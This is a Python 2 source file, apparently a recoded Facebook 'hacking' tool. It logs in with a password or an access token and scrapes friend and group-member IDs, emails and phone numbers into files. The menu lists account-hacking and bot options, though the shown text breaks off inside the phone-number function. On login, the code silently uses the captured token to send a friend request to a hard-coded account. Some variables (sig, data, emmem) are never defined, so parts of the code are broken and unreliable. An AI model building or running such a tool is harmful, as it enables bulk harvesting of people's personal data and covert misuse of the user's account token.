#!/usr/bin/python2

# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib

from multiprocessing.pool import ThreadPool

try:

	import mechanize

except ImportError:

	os.system("pip2 install mechanize")

try:

	import requests

except ImportError:

	os.system("pip2 install requests")

from requests.exceptions import ConnectionError

from mechanize import Browser

#-Setting-#

########

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

#-failed-#

def failed():

	print "\033[1;91m[!] Exit"

	os.sys.exit()

#-Animation-#

def jalan(z):

        for e in z + '\n':

                sys.stdout.write(e)

                sys.stdout.flush()

                time.sleep(00000.1)

##### LOGO #####

logo = """

\033[1;91m┌─────────────────────────────────────────────────────────────┐\033[1;91m

│ ▄▄▄▄▄▄                      █                    █          │\033[1;91m

│ █       ▄▄▄    ▄▄▄    ▄▄▄   █▄▄▄    ▄▄▄    ▄▄▄   █   ▄      │\033[1;91m

│ █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀       │\033[1;91m

│ █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█        │\033[1;91m

│ █      ▀▄▄▀█  ▀█▄▄▀  ▀█▄▄▀  ██▄█▀  ▀█▄█▀  ▀█▄█▀  █  ▀▄      │\033[1;91m

│

└─────────────────────────────────────────────────────────────┘\033[1;91m

\033[1;97m╔══════════════════════════════════════════════╗

\033[1;97m║\033[1;93m* \033[1;97mTeam    \033[1;91m:\033[1;96mAlone Pukhtoon \033[1;97m                                                                   

\033[1;97m║\033[1;93m* \033[1;97mRecoded  \033[1;91m:\033[1;96mkAmrAn PakhTooN urF AnonymouS kAmrAn \033[1;97m             

\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m:\033[1;96mhttps://github.com/hackerkamran007\033[1;97m                                

\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m:\033[1;92m\033[4mhttps://m.facebook.com/pokhtoon007\033[0m\033[1;97m    

\033[1;97m║\033[1;93m* \033[1;97mCredits \033[1;91m:\033[1;96mRiad From (Algeria) \033[1;97m                  

\033[1;97m║\033[1;93m* \033[1;37mYoutube \033[1;91m:\033[1;37m\033[4mWE ARE ANONYMOUS.\033[0m                        \033[1;97m      

\033[1;97m╚══════════════════════════════════════════════╝"""

# load #

def load():

	tiload = ['.   ','..  ','... ']

	for o in tiload:

		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

threads = []

sucessful = []

checkpoint = []

oks = []

action_failed = []

idfriends = []

idfromfriends = []

member_id = []

email= []

number = []

id = []

em = []

email_from_friends = []

hp = []

hpfromfriends = []

reaction = []

reactiongroup = []

comment = []

group_comment = []

listgroup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

##### choices Login #####

def tool_main_function():

	os.system('clear')

	print logo

	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"

	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Login using token"

	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"

	print "\033[1;97m║"

	login_method = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")

	if login_method =="":

		print"\033[1;91m[!] Wrong input"

		failed()

	elif login_method =="1":

		login()

	elif login_method =="2":

		fbtoken()

	elif login_method =="0":

		failed()

	else:

		print"\033[1;91m[!] Wrong input"

		failed()

##### LOGIN #####

#================#

def login():

	os.system('clear')

	try:

		fb_token = open('login.txt','r')

		menu()

	except (KeyError,IOError):

		os.system('clear')

		print logo

		print('\033[1;91m[☆] \033[1;92mLOGIN YOUR FACEBOOK ID \033[1;91m[☆]')

		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')

		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')

		load()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\033[1;91m[!] No connection"

			failed()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				pick = open("login.txt", 'w')

				pick.write(z['access_token'])

				pick.close()

				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'

                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\033[1;91m[!] No connection"

				failed()

		if 'checkpoint' in url:

			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			failed()

		else:

			print("\n\033[1;91m[!] Login Failed")

			os.system('rm -rf login.txt')

			time.sleep(0.01)

			login()

##### TOKEN #####

def fbtoken():

	os.system('clear')

	print logo

	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)

		a = json.loads(otw.text)

		fb_name = a['name']

		pick = open("login.txt", 'w')

		pick.write(fb_token)

		pick.close()

		menu()

	except KeyError:

		print "\033[1;91m[!] Wrong"

		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")

		if e =="":

			failed()

		elif e =="y":

			login()

		else:

			failed()

##### MENU ##########################################

def menu():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)

		a = json.loads(otw.text)

		fb_name = a['name']

		id = a['id']

	except KeyError:

		os.system('clear')

		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[!] No connection"

		failed()

	os.system("reset")

	print logo

	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"

	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id

	print "\033[1;97m╚"+40*"═"

	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m User information"

	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get Id/email/hp"

	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Hack facebook account               "

	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot       "

	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Others           "

	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Show token           "

        print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Update           "

	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Delete trash          "

	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m LogOut            "

	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit the program          "

	print "║"

	choices()

#-

def choices():

	pick = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")

	if pick =="":

		print "\033[1;91m[!] Wrong input"

		choices()

	elif pick =="1":

		information()

	elif pick =="2":

		dump()

	elif pick =="3":

		menu_hack()

	elif pick =="4":

		menu_bot()

	elif pick =="5":

		lain()

	elif pick =="6":

		os.system('clear')

		print logo

		fb_token=open('login.txt','r').read()

		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		menu()

        elif pick =="7":

                os.system('clear')

                print logo

                print 40 * '\033[1;97m\xe2\x95\x90'

                os.system('git pull origin master')

                raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')

                menu()

	elif pick =="8":

		os.remove('out')

	elif pick =="9":

		os.system('rm -rf login.txt')

		os.system('xdg-open https://www.facebook.com/rizz.magizz')

		failed()

	elif pick =="0":

		failed()

	else:

		print "\033[1;91m[!] Wrong input"

		choices()

##### INFO #####

def information():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	os.system('clear')

	print logo

	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')

	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')

	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)

	cok = json.loads(r.text)

	for i in cok['data']:

		if aid in i['name'] or aid in i['id']:

			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			print 42*"\033[1;97m═"

			try:

				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']

			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'

			try:

				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']

			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'

			try:

				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']

			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'

			try:

				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']

			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'

			try:

				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']

			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'

			try:

				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']

			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'

			try:

				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '

				for q in z['education']:

					try:

						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']

					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'

			except KeyError: pass

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			menu()

		else:

			pass

	else:

		print"\033[1;91m[✖] User not found"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		menu()

##### DUMP #####

def dump():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"

	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"

	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get group member ID"

	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member email"

	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member phone number"

	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get email friend"

	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend from friend"

	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get a friend's phone number"

	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number from friend"

	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"

	print "║"

	choose_dump()

#-----choices

def choose_dump():

	choose_from = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")

	if choose_from =="":

		print "\033[1;91m[!] Wrong input"

		choose_dump()

	elif choose_from =="1":

		friends_id()

	elif choose_from =="2":

		id_from_friends()

	elif choose_from =="3":

		id_member_group()

	elif choose_from =="4":

		em_member_group()

	elif choose_from =="5":

		no_member_group()

	elif choose_from =="6":

		email()

	elif choose_from =="7":

		email_from_friends()

	elif choose_from =="8":

		phone_number()

	elif choose_from =="9":

		phone_number_from_friends()

	elif choose_from =="0":

		menu()

	else:

		print "\033[1;91m[!] Wrong input"

		choose_dump()

##### ID friends #####

def friends_id():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		r=requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)

		z=json.loads(r.text)

		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/friends_id.txt','w')

		for a in z['data']:

			idfriends.append(a['id'])

			make_action.write(a['id'] + '\n')

			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)

		make_action.close()

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfriends))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/friends_id.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### ID FROM FRIENDS #####

def id_from_friends():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")

		try:

			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)

			op = json.loads(seat.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]

		except KeyError:

			print"\033[1;91m[!] Friend not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			dump()

		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)

		z=json.loads(r.text)

		jalan('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/friends_id_from_friends.txt','w')

		for a in z['friends']['data']:

			idfromfriends.append(a['id'])

			make_action.write(a['id'] + '\n')

			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)

		make_action.close()

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/friends_id_from_friends.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### ID FROM GROUP MEMBER #####

def id_member_group():

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')

		try:

			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)

			asw=json.loads(r.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']

		except KeyError:

			print"\033[1;91m[!] Group not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			dump()

		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/member_group.txt','w')

		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999999&access_token='+fb_token)

		s=json.loads(re.text)

		for a in s['data']:

			member_id.append(a['id'])

			make_action.write(a['id'] + '\n')

			print ("\r\033[1;97m[ \033[1;92m"+str(len(member_id))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)

		make_action.close()

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(member_id))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/member_group.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### EMAIL FROM group #####

def em_member_group():

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')

		try:

			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)

			asw=json.loads(r.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']

		except KeyError:

			print"\033[1;91m[!] Group not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			dump()

		jalan('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/em_member_group.txt','w')

		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)

		s=json.loads(re.text)

		for a in s['data']:

			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			try:

				emmem.append(z['email'])

				make_action.write(z['email'] + '\n')

				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)

			except KeyError:

				pass

		make_action.close()

		print 42*"\033[1;97m═"

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/em_member_group.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### PHONE NUMBER FROM GROUP #####

def no_member_group():

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')

		try:

			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)

			asw=json.loads(r.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']

		except KeyError:

			print"\033[1;91m[!] Group not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			dump()

		jalan('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/no_member_group.txt','w')

		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)

		s=json.loads(re.text)

		for a in s['data']:

			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			try:

				number.append(z['mobile_phone'])

				make_action.write(z['mobile_phone'] + '\n')

				print ("\r\033[1;97m[ \033[1;92m"+str(len(number))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)

			except KeyError:

				pass

		make_action.close()

		print 42*"\033[1;97m═"

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(number))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/no_member_group.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### EMAIL #####

def email():

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)

		a = json.loads(r.text)

		jalan('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/email_friends.txt','w')

		for i in a['data']:

			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			try:

				em.append(z['email'])

				make_action.write(z['email'] + '\n')

				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)

			except KeyError:

				pass

		make_action.close()

		print 42*"\033[1;97m═"

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/email_friends.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### EMAIL FROM FRIENDS #####

def email_from_friends():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")

		try:

			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)

			op = json.loads(seat.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]

		except KeyError:

			print"\033[1;91m[!] Friend not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			dump()

		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)

		a = json.loads(r.text)

		jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/em_friends_from_friends.txt','w')

		for i in a['data']:

			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			try:

				email_from_friends.append(z['email'])

				make_action.write(z['email'] + '\n')

				print ("\r\033[1;97m[ \033[1;92m"+str(len(email_from_friends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)

			except KeyError:

				pass

		make_action.close()

		print 42*"\033[1;97m═"

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(email_from_friends))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/em_friends_from_friends.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### PHONE NUMBER #####

def phone_number():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		jalan('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')

		print 42*"\033[1;97m═"

